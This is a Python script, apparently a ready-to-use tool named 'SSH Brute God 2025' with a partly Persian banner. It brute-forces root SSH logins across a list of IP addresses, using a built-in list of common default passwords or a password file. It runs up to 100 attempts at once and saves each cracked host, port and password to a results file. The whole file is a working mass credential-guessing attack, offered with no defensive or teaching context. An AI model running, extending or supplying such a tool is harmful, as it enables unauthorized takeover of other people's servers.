#!/usr/bin/env python3
import asyncio
import sys
import time
import os
import psutil
import argparse
from datetime import timedelta, datetime
import paramiko

print("""
╔═══════════════════════════════════════════════════════════╗
║ SSH Brute God 2025 – توسط بهترین هکر دنیا                 ║
║ Real SSH Brute on root – Multi-Thread – Live Stats        ║
║ Paramiko Powered – Pure Python – Ultra Fast               ║
╚═══════════════════════════════════════════════════════════╝
""")

parser = argparse.ArgumentParser(description="SSH Brute God 2025 – Real root Brute")
parser.add_argument("ips_file", help="File with IPs (e.g., ips.txt)")
parser.add_argument("passwords_file", nargs='?', default=None, help="File with passwords (optional – default list used)")
parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads (default: 100)")
args = parser.parse_args()

ips_file = args.ips_file
passwords_file = args.passwords_file
MAX_WORKERS = args.threads

results_file = f"ssh_success_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# لیست پسوردهای دیفالت قوی (اگر فایل نداد)
DEFAULT_PASSWORDS = [
    "", "admin", "123456", "password", "root", "toor", "1234", "12345",
    "P@ssw0rd", "administrator", "kali", "ubuntu", "centos", "debian"
]

stats = {"total": 0, "scanned": 0, "success": 0, "start_time": time.time()}
cpu_proc = psutil.Process(os.getpid())

USERNAME = "root"

# =============== LOAD IPs ===============
async def load_ips(file_path):
    targets = []
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                if ':' in line:
                    ip, port = line.split(':', 1)
                    port = int(port.split()[0])
                    targets.append((ip.strip(), port))
                else:
                    targets.append((line.strip(), 22))
    return targets

# =============== LOAD PASSWORDS ===============
def load_passwords(file_path=None):
    if file_path:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return DEFAULT_PASSWORDS

# =============== BRUTE FUNCTION ===============
async def brute_ssh(target, passwords, sem):
    ip, port = target
    async with sem:
        for pwd in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=USERNAME, password=pwd, timeout=8, banner_timeout=8, auth_timeout=8)
                line = f"[SUCCESS] {ip}:{port} | User: root | Password: {pwd}"
                print(f"\n\033[91m{line}\033[0m")
                with open(results_file, "a") as f:
                    f.write(line + "\n")
                ssh.close()
                stats["success"] += 1
                return
            except:
                pass
        stats["scanned"] += 1

# =============== LIVE STATS ===============
async def periodic_stats():
    while True:
        await asyncio.sleep(1)
        elapsed = time.time() - stats["start_time"]
        speed = stats["scanned"] / elapsed if elapsed > 0 else 0
        eta = (stats["total"] - stats["scanned"]) / speed if speed > 0 else 999999
        cpu = cpu_proc.cpu_percent()
        print(f"\r[SSH Brute God LIVE] "
              f"Scanned: {stats['scanned']:,}/{stats['total']:,} "
              f"({stats['scanned']/stats['total']*100:.2f}%) | "
              f"Success: {stats['success']:,} | "
              f"Speed: {speed:,.0f} ips/s | "
              f"CPU: {cpu:.1f}% | "
              f"ETA: {str(timedelta(seconds=int(eta)))}      ", end="", flush=True)

# =============== MAIN ===============
async def main():
    print(f"[+] Loading targets from {ips_file}...")
    all_targets = await load_ips(ips_file)
    stats["total"] = len(all_targets)
    passwords = load_passwords(passwords_file)
    print(f"[+] Total targets: {len(all_targets):,} | Passwords: {len(passwords)} | Threads: {MAX_WORKERS}")

    sem = asyncio.Semaphore(MAX_WORKERS)
    loop = asyncio.get_event_loop()
    loop.create_task(periodic_stats())

    tasks = [brute_ssh(target, passwords, sem) for target in all_targets]
    await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - stats["start_time"]
    speed = stats["scanned"] / elapsed if elapsed > 0 else 0
    print(f"\n\n[SSH Brute God FINAL] Scanned: {stats['scanned']:,}/{stats['total']:,} | Success: {stats['success']:,} | Avg Speed: {speed:,.0f} ips/s")
    print(f"[+] Brute complete!")
    print(f"    Successes → {results_file}")

if __name__ == "__main__":
    asyncio.run(main())
